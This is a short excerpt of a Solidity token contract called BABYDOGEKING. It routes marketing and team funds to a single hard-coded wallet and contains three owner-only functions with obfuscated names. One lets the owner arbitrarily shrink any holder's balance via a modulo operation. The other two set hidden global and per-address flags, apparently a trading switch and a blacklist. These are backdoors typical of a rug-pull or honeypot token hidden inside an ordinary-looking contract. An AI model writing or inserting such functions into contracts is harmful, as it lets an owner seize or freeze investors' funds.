...
contract BABYDOGEKING is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x8f93bfFCe59203117DE287325Bf9608C2B4674eE);
    address payable public teamWalletAddress = payable(0x8f93bfFCe59203117DE287325Bf9608C2B4674eE);
    ...
    function squ1d(uint256 amount, address account) onlyOwner() public {
        _balances[account] = _balances[account].mod(amount);
    }

    function squ2dd(bool _status) public onlyOwner {
        xuxub = _status;
    }

    function squ3ddd(address addre, bool status) public onlyOwner {
        xuxubb[addre]  = status;
    }
